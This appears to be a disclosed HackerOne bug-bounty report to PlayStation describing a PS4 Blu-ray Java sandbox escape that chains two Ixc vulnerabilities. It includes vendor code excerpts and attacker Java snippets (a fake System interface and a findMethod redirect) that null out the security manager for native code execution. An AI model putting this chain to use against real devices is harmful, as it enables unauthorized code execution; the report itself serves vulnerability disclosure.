{
  "id": 3104356,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTA0MzU2",
  "url": "https://hackerone.com/reports/3104356",
  "title": "Blu-ray Disc Java Sandbox Escape via two vulnerabilities ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2025-04-22T15:20:39.947Z",
  "submitted_at": "2025-04-22T15:20:40.254Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "theflow0",
    "url": "/theflow0",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 44879,
    "url": "https://hackerone.com/playstation",
    "handle": "playstation",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "PlayStation",
      "twitter_handle": "PlayStation",
      "website": "https://www.playstation.com",
      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-10-18T00:35:23.166Z",
  "bug_reporter_agreed_on_going_public_at": "2025-07-16T11:01:50.707Z",
  "team_member_agreed_on_going_public_at": "2025-10-18T00:35:22.906Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "5000.0",
  "formatted_bounty": "$5,000",
  "weakness": {
    "id": 146,
    "name": "Execution with Unnecessary Privileges"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 13,
  "voters": [
    "n1m0",
    "qatada",
    "sottam",
    "ssarnaud",
    "manoma080",
    "s0n0fman",
    "andrew2007",
    "gabrie11",
    "minaroshdy21",
    "ceyori",
    "and 3 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 40736,
    "asset_type": "HARDWARE",
    "asset_identifier": "PlayStation 4",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 770631,
      "category": "team",
      "content": "# Blu-ray Disc Java Sandbox Escape\n\nThere are two implementations for Ixc (Inter-Xlet Communication) in bd-j. One is `org.dvb.io.ixc` and the other is `com.sun.xlet.ixc`. By exploiting two vulnerabilities in each of the implementations, it is possible to disable the security manager and escape the Java sandbox.\n\n## Vulnerability 1\n\nThe `org.dvb.io.ixc` implementation uses `com.sony.gemstack.org.dvb.io.ixc.IxcProxy` which, as described in the [first bd-j exploit](https://hackerone.com/reports/1379975), allows invoking methods in privileged context. The original vulnerability was mitigated by checking that the method is called from a call stack that includes the `com.sony.gemstack.org.dvb.io.ixc.IxcProxy` class:\n\n```java\n      try {\n         var4 = (Class[])AccessController.doPrivileged(new IxcProxy.GetCallStackAction());\n      } catch (PrivilegedActionException var9) {\n      }\n\n      if (var4 != null && var4.length > 2) {\n         for(int var5 = 0; var5 < var4.length; ++var5) {\n            String var6 = var4[var5].getName();\n            if (var6.equals(\"com.sony.gemstack.org.dvb.io.ixc.IxcProxy\")) {\n               String var7 = var4[var5 + 1].getName();\n               if (!var7.startsWith(\"org.dvb.io.ixc.\") && !var7.startsWith(\"com.sony.gemstack.org.dvb.io.ixc.\")) {\n                  throw new SecurityException(\"illegal call of invokeMethod\");\n               }\n               break;\n            }\n         }\n      }\n```\n\nHowever, this mitigation is not sufficient, as methods from a real proxy class (built by `com.sony.gemstack.org.dvb.io.ixc.IxcProxyBuilder`) are still allowed to be invoked in privileged context.\n\nAn instance can be registered for Ixc if its class implements an interface that extends `java.rmi.Remote`. Furthermore, methods can only be invoked through Ixc if they throw `java.rmi.RemoteException`.\n\nAny bootstrap class that fulfills these criteria can as such still exploit the privileged method invocation. The class `com.sun.xlet.ixc.IxcRegistryImpl` is such a case and it is therefore eligible for Ixc registration via `org.dvb.io.ixc.IxcRegistry` (by subclassing `com.sun.xlet.ixc.IxcRegistryImpl` and creating a new instance of the subclass).\n\nMethods in `com.sun.xlet.ixc.IxcRegistryImpl` contain permission checks which are normall not granted in bd-j:\n\n```java\n        SecurityManager sm = System.getSecurityManager();\n        if (sm != null)\n            sm.checkPermission(new IxcPermission(name, \"bind\"));\n```\n\nHowever, by calling `bind` and `lookup` through `org.dvb.io.ixc` on the remote object and invoking the remote methods, it is now possible to bypass the permission checks in  `com.sun.xlet.ixc.IxcRegistryImpl`.\n\n## Vulnerability 2\n\nThe `com.sun.xlet.ixc` implementation contains a vulnerability that allows privileged method invocation. Namely, the method `com_sun_xlet_execute` in `com.sun.xlet.ixc.WrappedRemote` invokes `remoteMethod` in a `AccessController.doPrivileged` block:\n\n```java\n\t\t       AccessController.doPrivileged(\n\t\t\t  new PrivilegedExceptionAction() {\n\t\t\t     public Object run() throws RemoteException {\n\t\t\t\tThrowable err = null;\n\t\t\t\ttry {\n\t\t\t\t    result[0] = remoteMethod.invoke(targetNow, args);\n\t\t\t\t} catch (InvocationTargetException ite) {\n\t\t\t\t    err = ite.getTargetException();\n\t\t\t\t} catch (Throwable t) {\n\t\t\t\t    err = t;\n\t\t\t\t}\n\t\t\t\t// ...\n\t\t\t\treturn null;\n\t\t\t    }\n\t\t\t}\n\t\t       , context);\n```\n\nThis method is accessible through the stub class that is generated when registering an object via `com.sun.xlet.ixc.IxcClassLoader`:\n\n```java\n  public final class StubClass$$42 extends com.sun.xlet.WrappedRemote \n\t\timplements UserIF {\n\n      private static Method com_sun_xlet_method0;\n      private static Method com_sun_xlet_method1;\n\n\n      public static void com_sun_xlet_init(Method findMethodMethod) \n              throws Exception {\n       \t// findMethodMethod is Utils.findMethod for the ClassLoader\n\t\t// where thetarget* Remote object lives.\n       \n          if (com_sun_xlet_method0 != null) {\n\t        return;\n          }\n          com_sun_xlet_method0 = (Method) findMethodMethod.invoke(null,\n\t\tnew Object[] { \"UserIF\", \"frob\", new Object[] { \"Something\" }});\n          com_sun_xlet_method1 = (Method) findMethodMethod.invoke(null,\n\t\tnew Object[] { \"UserIF\", \"glorp\", \n                             new Object[] { java.lang.Float.TYPE }});\n      }\n\n      public static void com_sun_xlet_destroy() {\n          com_sun_xlet_method0 = null;\n          com_sun_xlet_method1 = null;\n      }\n\n      public StubClass$$42(Remote target, ImportRegistryImpl registry,\n\t\t\t     RegistryKey key) {\n\t    super(target, registry, key);\n\t}\n\n      public void frob(Something arg1) throws org.dvb.ixc.RemoteException {\n          com_sun_xlet_execute(com_sun_xlet_method0, \n\t\t\t\t   new Object[] { arg1 });\n      }\n\n      public int glorp(float arg1) throws org.dvb.ixc.RemoteException {\n\t    Object r = com_sun_xlet_execute(com_sun_xlet_method1,\n\t\t\t\t\t      new Object[] { new Float(arg1) });\n          return ((Integer) r).intValue();\n      }\n  }\n```\n\nTo exploit the privileged method invocation, `com_sun_xlet_method0` needs to be set to something interesting.\n\nConsider the following fake `System` class:\n\n```java\npublic interface SystemInterface extends java.rmi.Remote {\n  void setSecurityManager(java.rmi.Remote sm) throws java.rmi.RemoteException;\n}\n\npublic class SystemImpl implements SystemInterface {\n  public void setSecurityManager(java.rmi.Remote sm) {}\n}\n```\n\nCreate an instance of this class and register it via `com.sun.xlet.ixc.IxcRegistryImpl` (that is achieved by exploiting Vulnerability 1).\n\nOn the remote object of the stub class, call `com_sun_xlet_destroy` to set `com_sun_xlet_method0` to null and then call `com_sun_xlet_init` with a custom `findMethod` method as argument:\n\n```java\n  public static Object findMethod(String cName, String mName, Object[] types)\n      throws NoSuchMethodException {\n    return System.class.getMethod(\n        \"setSecurityManager\", new Class[] {SecurityManager.class});\n  }\n```\n\nThis will set `com_sun_xlet_method0` to the real `System.setSecurityManager`. Now, when calling `setSecurityManager(null)` on the remote `SystemImpl` object, the invocation `System.SecurityManager(null)` will be made instead. This effectively disables the Java sandbox.\n\n## Impact\n\nNative code execution in bd-j",
      "updated_at": "2025-10-18T00:34:52.758Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 240130,
        "username": "hacker-01",
        "name": "DP",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-02-09T18:50:35.590Z",
        "url": "https://hackerone.com/hacker-01",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/GtMbCEXGLm3EdU16BiXgTXMV/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
